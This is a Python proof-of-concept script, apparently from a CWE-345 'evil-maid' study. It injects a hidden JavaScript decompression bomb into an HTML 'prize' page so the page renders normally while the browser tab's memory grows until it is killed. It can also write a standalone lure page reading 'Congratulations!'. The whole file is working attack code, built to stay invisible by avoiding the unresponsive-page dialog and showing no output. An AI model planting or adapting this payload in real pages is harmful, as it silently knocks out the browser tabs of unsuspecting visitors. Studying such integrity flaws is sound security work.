#!/usr/bin/env python3
"""Inject a decompression-bomb script into the prize page, keeping it look-alike.

The evil-maid does not replace the prize page -- that would be visibly different.
It injects a script into the ORIGINAL prize.html, so the page renders exactly as
before (the rickroll image and text), while a background script grows tab memory
until the browser's out-of-memory guard kills the tab.

The payload is a decompression bomb: a small gzip seed embedded as base64 (a few KB
inflating to megabytes), inflated on load and held in a growing array. The loop is
asynchronous (it yields between chunks), so the page never blocks the UI thread and
never shows the "page unresponsive -- stop it?" dialog, and it prints nothing, so
the page stays visually identical to the real prize.

Honest scope: browser site-isolation gives each tab its own process with an OOM
killer, so the realistic effect is a dead TAB, not a dead system. This is a proof
of concept for CWE-345: unauthenticated storage lets an attacker swap passive
content for active code the victim runs.
"""
import base64
import gzip


def _gzip_seed(zeros):
    """A gzip stream of `zeros` zero bytes -- tiny on disk, large when inflated."""
    return gzip.compress(b"\x00" * zeros, compresslevel=9)


_SCRIPT = """<script>
/* PROOF OF CONCEPT -- attack2 evil-maid payload (CWE-345). Silent decompression
   bomb: a {seed_kib} KiB gzip seed inflates to {unit_mib} MiB per held copy, grown
   asynchronously until the tab is OOM-killed. No output, so the page looks normal. */
(function () {{
  var SEED_B64 = "{seed_b64}";
  function b64ToBytes(s) {{
    var bin = atob(s), u = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    return u;
  }}
  async function inflate(bytes) {{
    var ds = new DecompressionStream("gzip");
    var w = ds.writable.getWriter(); w.write(bytes); w.close();
    var ab = await new Response(ds.readable).arrayBuffer();
    return new Uint8Array(ab);               // real memory, not sparse
  }}
  var hold = [];                             // never released -> memory only grows
  window.addEventListener("load", async function () {{
    var unit = await inflate(b64ToBytes(SEED_B64));
    while (true) {{
      hold.push(unit.slice());               // commit fresh pages of RAM
      await new Promise(function (r) {{ setTimeout(r, 0); }});   // yield: no "unresponsive" dialog
    }}
  }});
}})();
</script>"""


def payload_script(unit_mib=16):
    """Return the injectable <script> block carrying the bomb, as text."""
    seed = _gzip_seed(unit_mib * 1024 * 1024)
    return _SCRIPT.format(
        seed_b64=base64.b64encode(seed).decode("ascii"),
        seed_kib=max(1, len(seed) // 1024),
        unit_mib=unit_mib,
    )


def inject_bomb(html, unit_mib=16):
    """Inject the bomb script into `html` (bytes), keeping the page look-alike.

    The script goes just before </body> (else </html>, else at the end), so the
    original markup renders unchanged. Returns the modified HTML as bytes.
    """
    script = payload_script(unit_mib).encode("utf-8")
    text = html
    low = text.lower()
    for anchor in (b"</body>", b"</html>"):
        i = low.rfind(anchor)
        if i != -1:
            return text[:i] + script + b"\n" + text[i:]
    return text + b"\n" + script


def make_bomb_html(unit_mib=16):
    """Standalone minimal bomb page (used when there is no original to inject into)."""
    page = (b"<!DOCTYPE html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">"
            b"<title>Your prize</title></head><body>\n"
            b"<h1>Congratulations!</h1>\n</body></html>\n")
    return inject_bomb(page, unit_mib)


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "prize.html"
    data = make_bomb_html()
    with open(out, "wb") as f:
        f.write(data)
    print(f"wrote {out}: {len(data)} bytes (each held copy commits 16 MiB of RAM)")
